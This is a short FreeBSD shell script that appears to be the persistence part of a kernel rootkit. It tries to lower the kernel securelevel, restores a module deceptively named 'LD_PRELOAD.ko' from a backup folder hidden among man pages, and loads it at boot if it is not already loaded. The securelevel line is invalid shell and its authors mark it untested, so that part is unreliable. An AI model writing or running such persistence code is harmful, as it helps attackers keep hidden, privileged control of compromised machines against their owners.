#!/bin/sh

# might need to sleep more depending on how many resources (how slow the box is) the box has
sleep 10

# prevent againt LKM security
# untested line!!!
# untested line!!!
# untested line!!!
kern.securelevel=-1

LKM_NAME="LD_PRELOAD.ko"
BACKUP_DIR="/usr/local/share/man/man1/backups"
# Check if LD_PRELOAD.ko exists in /boot/modules
if [ ! -f /boot/modules/$LKM_NAME ]; then
    cp "$BACKUP_DIR/$LKM_NAME" "/boot/modules/"
fi

/sbin/kldstat | grep -q "LD_PRELOAD.ko" || /sbin/kldload /boot/modules/LD_PRELOAD.ko

